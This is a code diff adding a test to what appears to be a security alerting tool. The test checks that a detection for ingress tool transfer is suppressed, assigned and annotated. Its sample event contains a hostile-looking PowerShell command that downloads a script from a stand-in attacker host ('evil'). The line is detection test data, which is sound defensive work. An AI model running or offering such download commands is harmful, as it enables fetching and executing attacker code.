@@ -265,6 +265,44 @@ def test_iocs_roundtrip_and_pipeline_alert(clean_db):
     assert db.ioc_counts()["total"] == 0
 
 
+def test_suppression_pipeline_assignee_and_notes(clean_db):
+    db = clean_db
+    from app import pipeline
+    from app.triage import runtime as suprt, suppression as supm
+
+    rt.set_engine(de.DetectionEngine(de.load_rules(RULES_DIR)))
+    sid = db.create_suppression("test", rule_id="lo-ingress-tool-transfer",
+                                src_ip="203.0.113.9")
+    suprt.reload_index()
+    try:
+        with db.pool().connection() as conn:
+            res = pipeline.write_stream(
+                conn, [_evt(vendor="x", src_ip="203.0.113.9",
+                            message="powershell Invoke-WebRequest http://evil/x.ps1")],
+                batch_id=1)
+            conn.commit()
+    finally:
+        rt.set_engine(None)
+        suprt.set_index(supm.SuppressionIndex())
+
+    assert res.alerts == []                                  # suppressed -> not dispatched
+    suppressed, _ = db.recent_alerts({"status": "suppressed"}, 50, 0)
+    assert any(a["rule_id"] == "lo-ingress-tool-transfer" for a in suppressed)
+    default, _ = db.recent_alerts({}, 50, 0)                 # default view hides suppressed
+    assert all(a["status"] != "suppressed" for a in default)
+    assert next(s for s in db.list_suppressions() if s["id"] == sid)["hit_count"] >= 1
+
+    aid = suppressed[0]["id"]
+    db.set_alert_assignee(aid, "alice")
+    assert db.get_alert(aid)["assignee"] == "alice"
+    db.add_alert_note(aid, "alice", "reviewed — known admin tooling")
+    notes = db.alert_notes(aid)
+    assert len(notes) == 1 and notes[0]["author"] == "alice"
+
+    db.delete_suppression(sid)
+    assert db.list_suppressions() == []
+
+
 def test_batch_lifecycle_and_sha_lookup(clean_db):
     db = clean_db
     bid = db.create_batch("fw.log", "sha-abc", "paloalto", "paloalto_csv")
